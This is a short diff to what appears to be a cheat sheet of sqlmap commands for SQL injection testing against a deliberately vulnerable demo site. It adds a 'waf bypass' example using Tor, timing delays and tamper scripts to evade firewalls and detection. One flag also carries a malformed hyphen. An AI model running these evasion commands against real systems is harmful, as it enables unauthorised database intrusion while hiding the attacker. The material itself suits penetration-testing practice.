@@ -8,3 +8,7 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --batch --random-ag
 ```
 sqlmap -m sqli_urls.txt --random-agent --batch --level=3 --risk=2 --current-db --tamper=space2comment,between,randomcase
 ```
+### More waf bypass
+```
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --tor --time-sec 20 -‐banner --delay 10 --tamper=space2comment,between,randomcase
+```
